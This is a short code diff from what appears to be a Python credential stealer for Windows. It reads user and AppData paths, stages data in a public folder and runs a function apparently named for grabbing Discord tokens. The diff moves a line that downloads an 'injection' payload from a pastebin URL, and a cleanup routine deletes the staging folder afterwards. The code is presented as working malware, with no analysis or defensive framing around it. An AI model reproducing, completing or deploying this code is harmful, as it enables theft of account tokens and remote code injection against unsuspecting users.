@@ -29,7 +29,6 @@ user = os.environ.get("USERNAME")
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 Aqua = "C:/Users/Public/Aqua"
-injection = requests.get("https://pastebin.com/raw/TnQngK6n").text
 
 
 
@@ -299,7 +298,7 @@ def getDcToken():
 
     main_tokens()
 
-
+injection = requests.get("https://pastebin.com/raw/TnQngK6n").text
 # Clean Up
 def cleanUp():
     shutil.rmtree(Aqua)
